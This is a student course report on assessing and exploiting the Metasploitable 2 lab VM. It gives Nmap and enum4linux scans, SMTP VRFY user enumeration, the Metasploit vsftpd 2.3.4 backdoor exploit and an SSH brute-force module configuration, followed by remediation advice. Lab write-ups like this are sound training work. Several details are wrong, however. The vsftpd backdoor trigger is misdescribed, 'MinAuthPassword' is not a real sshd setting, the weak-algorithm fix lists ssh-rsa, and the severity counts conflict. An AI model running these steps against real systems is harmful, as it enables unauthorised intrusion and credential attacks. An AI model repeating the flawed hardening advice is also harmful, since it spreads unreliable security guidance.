# Vulnerability Assessment & Exploitation of Metasploitable 2

## Final Project Submission

---

### Project Title Page

**Project Title:** Vulnerability Assessment & Exploitation of Metasploitable 2

**Student Name:** Tukaram

**Batch:** WSLC-483

**Course:** Cybersecurity & Ethical Hacking

**Submission Date:** April 2026

---

## 1. Objective of the Assessment

The primary objective of this assessment is to perform a comprehensive Vulnerability Assessment and Penetration Testing operation on Metasploitable 2, a purposely vulnerable Linux virtual machine designed for security training and testing environments.

### Specific Goals:

- Identify open services and ports on the target machine through network scanning
- Enumerate detailed information about running services and potential weak configurations
- Exploit at least 2 critical vulnerabilities using industry-standard tools and techniques
- Gain shell access or obtain sensitive system information to demonstrate successful exploitation
- Document all vulnerabilities, attack vectors, and exploitation outcomes systematically
- Assess risk levels and provide remediation recommendations for each identified vulnerability

### Educational Context:

This project is conducted in a controlled laboratory environment as part of the cybersecurity certification program. Metasploitable 2 is an intentionally vulnerable system designed for learning and practicing penetration testing techniques in a safe, legal manner.

---

## 2. Environment Setup & Tools Used

### 2.1 Laboratory Environment

The entire assessment was conducted in an isolated virtual laboratory environment consisting of:

| Component | Specification |
|-----------|---------------|
| **Attacking Machine** | Kali Linux (Latest Version) |
| **Target Machine** | Metasploitable 2 (Ubuntu-based) |
| **Virtualization Platform** | VMware Workstation / VirtualBox |
| **Network Type** | Host-Only / NAT Network |
| **Target IP Address** | 192.168.164.129 |

### 2.2 Tools Used

The following penetration testing tools were utilized during this assessment:

#### 2.2.1 Network Scanning Tools

| Tool | Purpose | Version |
|------|---------|---------|
| **Nmap** | Port scanning and service enumeration | Latest |

#### 2.2.2 Enumeration Tools

| Tool | Purpose |
|------|---------|
| **enum4linux** | Samba/SMB enumeration and user discovery |

#### 2.2.3 Exploitation Frameworks

| Tool | Purpose |
|------|---------|
| **Metasploit Framework** | Exploitation and post-exploitation |
| **Netcat** | Network connectivity testing and banner grabbing |

#### 2.2.4 Additional Utilities

- SSH Client (OpenSSH)
- FTP Client

### 2.3 Target Machine Credentials

| Parameter | Value |
|-----------|-------|
| **Username** | msfadmin |
| **Password** | msfadmin |

---

## 3. Scanning Results

### 3.1 Initial Discovery

The target machine (Metasploitable 2) was powered on and accessed through the virtualization platform. The IP address was identified using the `ifconfig` command, revealing the target at **192.168.164.129**.

![Environment Setup - Target Machine IP Address](image2.png)

### 3.2 Port Scanning

A comprehensive port scan was performed using Nmap to identify all open ports and running services on the target machine.

**Command Used:**
```bash
nmap -n -sV -p- 192.168.164.129
```

**Scan Parameters:**
- `-n`: Disable DNS resolution
- `-sV`: Service version detection
- `-p-`: Scan all ports (1-65535)

### 3.3 Identified Open Ports and Services

| Port | Service | Version | State |
|------|---------|---------|-------|
| 21 | FTP | vsftpd 2.3.4 | Open |
| 22 | SSH | OpenSSH 4.7p1 | Open |
| 23 | Telnet | - | Open |
| 25 | SMTP | Postfix | Open |
| 80 | HTTP | Apache 2.2.8 | Open |
| 111 | RPCbind | - | Open |
| 139 | NetBIOS-SSN | Samba 3.0.20 | Open |
| 445 | Microsoft-ds | Samba 3.0.20 | Open |
| 512 | exec | - | Open |
| 513 | login | - | Open |
| 514 | shell | - | Open |
| 1099 | Java RMI | - | Open |
| 1524 | Ingreslock | - | Open |
| 3306 | MySQL | 5.0.51a | Open |
| 5432 | PostgreSQL | 8.3 | Open |
| 5900 | VNC | - | Open |
| 6000 | X11 | - | Open |
| 6667 | UnrealIRCd | - | Open |
| 8009 | Apache Jserv | - | Open |
| 8180 | Apache Tomcat | - | Open |

![Nmap Scanning Results](image3.png)

### 3.4 Critical Findings from Scanning

1. **FTP Service (Port 21):** Running vsftpd 2.3.4 - Known vulnerable version with backdoor
2. **SSH Service (Port 22):** OpenSSH 4.7p1 - Outdated version with weak algorithms
3. **SMTP Service (Port 25):** Postfix mail server - Potential user enumeration vector
4. **Multiple High-Risk Services:** Unnecessary services running (Telnet, VNC, X11)

---

## 4. Enumeration Techniques Applied

### 4.1 SMB/NetBIOS Enumeration using enum4linux

enum4linux is primarily used to gather information in the early stages of a penetration test to find potential entry points, such as open shares or weak user enumeration restrictions.

#### 4.1.1 Operating System Information

**Command:**
```bash
enum4linux -o 192.168.164.129
```

**Results:**
- Operating System: Linux (Samba 3.0.20-Debian)
- Server: Unix (Ubuntu)
- SMB Version: 1.0
- Domain: MYGROUP

![enum4linux OS Enumeration](image4.png)

#### 4.1.2 User Enumeration

**Command:**
```bash
enum4linux -U 192.168.164.129
```

**Discovered Users:**
- root
- daemon
- bin
- sys
- sync
- games
- man
- lp
- mail
- news
- uucp
- proxy
- www-data
- backup
- list
- irc
- gnats
- nobody
- libuuid
- dhcp
- syslog
- klog
- daemon
- msfadmin
- user
- service

![enum4linux User Listing - Part 1](image5.png)
![enum4linux User Listing - Part 2](image6.png)
![enum4linux User Listing - Part 3](image7.png)

### 4.2 SMTP User Enumeration

SMTP enumeration was performed to identify valid users on the mail server, which could be used for further attacks.

**Method 1: Netcat Banner Grabbing**
```bash
nc 192.168.164.129 25
VRFY root
VRFY admin
VRFY msfadmin
```

**Method 2: Metasploit Auxiliary Module**
```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOST 192.168.164.129
set USER_FILE /home/ram/wrk/unames.txt
run
```

---

## 5. Exploitation Details

### 5.1 Exploitation of FTP Service (Port 21)

#### Method 1: Anonymous FTP Login

**Description:** The target FTP server allows anonymous access, which can be exploited to access shared files without authentication.

**Command:**
```bash
ftp 192.168.164.129
```

**Credentials:**
- Username: anonymous
- Password: (empty/press enter)

**Result:** Successfully logged in as anonymous user, providing access to shared FTP directories.

![Anonymous FTP Login](image8.png)

#### Method 2: vsftpd Backdoor Exploitation (Metasploit Framework)

**Description:** The vsftpd 2.3.4 version contains a malicious backdoor in the source code. When a username containing "(any" is specified with a password containing the string "]", the backdoor is triggered, opening a shell on port 6200.

**Vulnerability Details:**
- **CVE:** CVE-2011-2523
- **Severity:** Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Affected Version:** vsftpd 2.3.4

**Exploitation Steps:**

1. Launch Metasploit Framework:
```bash
msfconsole
```

2. Search for vsftpd exploit:
```bash
search vsftpd
```

3. Select the exploit:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

4. Configure options:
```bash
set RHOST 192.168.164.129
show options
```

5. Execute the exploit:
```bash
exploit
```

![vsftpd Exploit - Search and Setup](image9.png)
![vsftpd Exploit - Configuration](image10.png)

**Result:** Successful exploitation provided command shell access to the target system with root privileges.

![vsftpd Exploit - Shell Access](image11.png)

---

### 5.2 Exploitation of SSH Service (Port 22)

#### Description

The Secure Shell Protocol (SSH) is a cryptographic network protocol for operating network services securely over an unsecured network. SSH provides secure authentication and encrypted data communication between two computers.

#### Method: SSH Brute Force Attack

**Description:** SSH service was exploited using credential brute-forcing with username and password wordlists.

**Tools Used:** Metasploit Framework - ssh_login auxiliary module

**Exploitation Steps:**

1. Launch Metasploit Framework:
```bash
msfconsole
```

2. Search for SSH login module:
```bash
search ssh_login
```

3. Select the module:
```bash
use auxiliary/scanner/ssh/ssh_login
```

4. Configure options:
```bash
set RHOST 192.168.164.129
set USERPASS_FILE /home/ram/wrk/upass.txt
set USER_FILE /home/ram/wrk/unames.txt
set USER_AS_PASS true
set STOP_ON_SUCCESS true
```

5. Execute:
```bash
run
```

![SSH Brute Force Attack](image12.png)

#### Post-Exploitation: SSH Connection

Using the obtained credentials, SSH connection was established to the target system.

**Command:**
```bash
ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.164.129
```

**Note:** The `-o HostKeyAlgorithms=+ssh-rsa` flag is required because Metasploitable 2 uses outdated security protocols (ssh-rsa and ssh-dss) that are disabled by default in modern SSH clients.

**Connection Process:**
1. Enter "yes" to accept the host key fingerprint
2. Enter password: msfadmin (characters won't appear while typing)
3. Successfully authenticated and logged in

![SSH Login - Host Key](image13.png)

---

### 5.3 Exploitation of SMTP Service (Port 25)

#### Description

Simple Mail Transfer Protocol (SMTP) is an application layer protocol used for sending, receiving, and relaying outgoing emails between senders and receivers.

#### Method 1: User Enumeration via Netcat

**Description:** The SMTP server VRFY command can be used to enumerate valid usernames on the system.

**Command:**
```bash
nc 192.168.164.129 25
```

**VRFY Command Usage:**
```bash
VRFY root
VRFY msfadmin
VRFY admin
```

**Response Codes:**
- 250 or 252: User exists
- 550 or 502: Access denied/Unable to verify

![SMTP User Enumeration via Netcat](image14.png)

#### Method 2: Automated Enumeration via Metasploit

**Description:** Using the Metasploit SMTP enumeration module for automated user discovery.

**Steps:**
```bash
search smtp_enum
use auxiliary/scanner/smtp/smtp_enum
set RHOST 192.168.164.129
set USER_FILE /home/ram/wrk/unames.txt
set VERBOSE true
run
```

---

## 6. Post-Exploitation Insights

### 6.1 System Access Achieved

Through the exploitation processes, the following access was obtained:

| Service | Access Level | Method |
|---------|--------------|--------|
| FTP (vsftpd) | Root Shell | Backdoor Exploit |
| SSH | User Shell | Credential Brute Force |
| SMTP | User Enumeration | VRFY Command |

### 6.2 Information Gathered

After successful exploitation, the following information was accessible:

- **File System Access:** Full read/write access to all files
- **User Credentials:** Enumeration of system users
- **Service Configurations:** Access to configuration files
- **Network Information:** Internal network topology
- ** Sensitive Data:** Password hashes, configuration files

### 6.3 Privilege Escalation Opportunities

The initial access obtained through various exploits provides a foundation for further privilege escalation:

- Kernel Exploits: Potential escalation to root from current user access
- SUID Binaries: Misconfigured binaries with elevated privileges
- Cron Jobs: Exploitable scheduled tasks
- Sudo Misconfigurations: Unrestricted sudo access

---

## 7. Summary of Identified Vulnerabilities

### 7.1 Critical Vulnerabilities

| # | Vulnerability | CVE | Risk Level | Port | Service |
|---|-------------|-----|-----------|-----|---------|
| 1 | vsftpd 2.3.4 Backdoor | CVE-2011-2523 | Critical | 21 | FTP |
| 2 | Weak SSH Authentication | - | High | 22 | SSH |
| 3 | Anonymous FTP Access | - | High | 21 | FTP |
| 4 | SMTP User Enumeration | - | Medium | 25 | SMTP |

### 7.2 High-Risk Services Running

| Service | Port | Risk | Recommendation |
|---------|------|------|--------------|
| Telnet | 23 | Critical | Disable |
| VNC | 5900 | High | Disable |
| X11 | 6000 | High | Disable |
| MySQL | 3306 | Medium | Restrict access |
| PostgreSQL | 5432 | Medium | Restrict access |

### 7.3 Vulnerability Assessment Summary

| Category | Count |
|----------|-------|
| Critical Vulnerabilities | 2 |
| High Risk Issues | 4 |
| Medium Risk Issues | 3 |
| Total Findings | 9 |

---

## 8. Fix Recommendations

### 8.1 Critical Fixes

#### 1. vsftpd Backdoor (Port 21)

**Current Issue:** vsftpd 2.3.4 contains a malicious backdoor that provides unauthenticated root access.

**Remediation Steps:**
1. Upgrade vsftpd to the latest version:
   ```bash
   apt-get update && apt-get upgrade vsftpd
   ```

2. Disable anonymous FTP access if not required:
   ```bash
   anonymous_enable=NO
   ```

3. Configure vsftpd with strong TLS encryption

4. Implement fail2ban for brute force protection

**Priority:** Critical - Immediate action required

#### 2. Weak SSH Authentication (Port 22)

**Current Issue:** SSH service allows authentication with weak passwords and outdated algorithms.

**Remediation Steps:**
1. Disable password authentication and use SSH keys:
   ```bash
   PasswordAuthentication no
   PubkeyAuthentication yes
   ```

2. Disable weak key algorithms:
   ```bash
   HostKeyAlgorithms ssh-rsa,ecdsa-sha2-nistp256
   KexAlgorithms curve25519-sha256@libssh.org
   ```

3. Implement strong password policy:
   ```bash
   MinAuthPassword 12
   ```

4. Use fail2ban or similar for brute force protection

5. Enable two-factor authentication

**Priority:** High - Action within 24-48 hours

### 8.2 Medium Priority Fixes

#### 3. SMTP User Enumeration (Port 25)

**Current Issue:** VRFY command allows user enumeration.

**Remediation:**
1. Disable VRFY command in Postfix configuration:
   ```bash
   disable_vrfy_command = yes
   ```

2. Implement SMTP authentication

**Priority:** Medium

#### 4. Disable Unnecessary Services

| Service | Port | Action |
|---------|------|--------|
| Telnet | 23 | Disable immediately |
| VNC | 5900 | Disable or restrict |
| X11 | 6000 | Disable |
| Ingreslock | 1524 | Disable |

**Commands:**
```bash
update-rc.d service_name disable
service service_name stop
```

### 8.3 Security Hardening Recommendations

1. **Network Segmentation:** Isolate services in different VLANs
2. **Firewall Configuration:** Implement strict firewall rules
3. **Regular Updates:** Keep all software updated
4. **Logging & Monitoring:** Enable comprehensive logging
5. **Intrusion Detection:** Deploy IDS/IPS solutions
6. **Security Audits:** Conduct regular vulnerability assessments

### 8.4 Patch Priority Matrix

| Priority | Timeframe | Vulnerabilities |
|----------|-----------|----------------|
| P1 - Critical | Immediate | vsftpd backdoor |
| P2 - High | 24-48 hours | SSH weak creds, Anonymous FTP |
| P3 - Medium | 1 week | SMTP enumeration |
| P4 - Low | 1 month | Disable unused services |

---

## 9. Conclusion

This vulnerability assessment and exploitation exercise successfully demonstrated the security weaknesses present in the Metasploitable 2 target system. Through systematic scanning, enumeration, and exploitation, several critical and high-severity vulnerabilities were identified and exploited.

### Key Achievements:

1. **Comprehensive Scanning:** Identified 20+ open ports and services
2. **Successful Exploitation:** Exploited 3 critical services (FTP, SSH, SMTP)
3. **Shell Access:** Achieved both root and user-level shell access
4. **User Enumeration:** Successfully enumerated system users
5. **Documentation:** Complete documentation of findings and remediation steps

### Lessons Learned:

1. **Outdated Software:** Running outdated vulnerable software versions poses significant security risks
2. **Default Credentials:** Default or weak credentials are a primary attack vector
3. **Unnecessary Services:** Every running service increases the attack surface
4. **Defense in Depth:** Multiple layers of security are essential
5. **Regular Patching:** Timely security updates are critical

### Recommendations:

The findings from this assessment highlight the importance of:
- Regular vulnerability assessments
- Immediate patching of critical vulnerabilities
- Security hardening of all systems
- Strong authentication mechanisms
- Minimal running services
- Continuous monitoring and logging

This assessment was conducted in a controlled educational environment and demonstrates the real-world risks faced by systems with poor security configurations. The techniques demonstrated here are commonly used by attackers, making it essential for organizations to proactively identify and remediate such vulnerabilities before they can be exploited.

---

## 10. References

1. Offsec Professional Certification - Metasploitable 2 Documentation
2. Nmap Reference Guide - https://nmap.org/
3. Metasploit Framework Documentation - https://www.metasploitframework.com/
4. enum4linux - https://tools.kali.org/password-attacks/enum4linux
5. CVE-2011-2523 - vsftpd Backdoor Vulnerability
6. OWASP Top 10 - Web Application Security
7. NIST Special Publication 800-53 - Security and Privacy Controls
8. Kali Linux Documentation - https://www.kali.org/

---

## Appendix A: Screenshots Index

| Image | Description |
|-------|-------------|
| Image 1 | Metasploitable 2 Login Screen |
| Image 2 | Target Machine IP Address (ifconfig) |
| Image 3 | Nmap Scanning Results |
| Image 4 | enum4linux OS Enumeration |
| Image 5 | enum4linux User Listing (Part 1) |
| Image 6 | enum4linux User Listing (Part 2) |
| Image 7 | enum4linux User Listing (Part 3) |
| Image 8 | Anonymous FTP Login |
| Image 9 | vsftpd Exploit - Search and Setup |
| Image 10 | vsftpd Exploit - Configuration |
| Image 11 | vsftpd Exploit - Shell Access |
| Image 12 | SSH Brute Force Attack |
| Image 13 | SSH Login - Host Key Verification |
| Image 14 | SMTP User Enumeration via Netcat |

---

## Appendix B: Commands Reference

### Network Scanning
```bash
nmap -n -sV -p- <target_ip>
```

### Enumeration
```bash
enum4linux -o <target_ip>
enum4linux -U <target_ip>
```

### FTP Exploitation
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target_ip>
exploit
```

### SSH Brute Force
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOST <target_ip>
set USER_FILE <wordlist>
set USERPASS_FILE <wordlist>
run
```

### SMTP Enumeration
```bash
nc <target_ip> 25
VRFY <username>
```

---

**Report Generated By:** Tukaram  
**Batch:** WSLC-483  
**Date:** April 2026

---

*This report is submitted as part of the Final Project Assignment for the Cybersecurity & Ethical Hacking course.*